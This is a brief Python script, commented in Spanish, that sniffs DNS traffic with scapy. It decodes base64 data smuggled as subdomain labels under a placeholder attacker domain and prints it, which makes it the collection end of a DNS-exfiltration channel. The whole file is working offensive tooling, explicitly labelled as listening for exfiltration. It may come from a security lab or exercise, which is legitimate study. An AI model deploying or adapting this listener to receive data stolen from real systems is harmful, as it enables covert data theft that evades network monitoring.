#!/usr/bin/env python3

from scapy.all import *
import base64
import sys, signal, time, pdb

def exitHandler(sig, frame):
    print("\n[!] Aborting...\n");
    sys.exit(1)
signal.signal(signal.SIGINT, exitHandler)

ATTACKER_DOMAIN = "our-domain.com"
seen = set()

def procesarDns(pkt):
    if pkt.haslayer(DNS) and pkt.getlayer(DNS).qr == 0:
        queryName = pkt.getlayer(DNSQR).qname.decode("utf-8")
        
        if queryName in seen:
            return

        if ATTACKER_DOMAIN in queryName:
            # DNS utiliza FQDNs (Fully Qualified Domain Names) que terminan en punto (nodo raíz).
            dataEncoded = queryName.split(f".{ATTACKER_DOMAIN}")[0] # Usamos split() para extraer la parte izquierda (b64 data).
            decodedData = decodeDnsB64(dataEncoded);
            seen.add(queryName)
            print(decodedData, flush=True, end='')
            
def decodeDnsB64(data):
   # Reconstruir el padding (=) omitido en la transmisión DNS.
   # RFC 4648 -> alineación de 3 bytes (24 bits) a 4 caracteres (estira esos 24 bits y los corta en 4 pedazos de 6 bits, con lo cuales puede representar cierta cantidad de caracteres, etc).
      # Por lo que la data se debe mandar en una cantidad de caracteres que sean múltiplos de 4 (60 caracteres, por ejemplo).
    missingPadding = len(data) % 4
    if missingPadding:
        data += "=" * (4 - missingPadding)
    return base64.b64decode(data).decode("utf-8", errors='ignore')
    

if __name__ == "__main__":
    print("[*] Escucha exfiltración para {}".format(ATTACKER_DOMAIN))
    sniff(filter="udp port 53", prn=procesarDns)
  
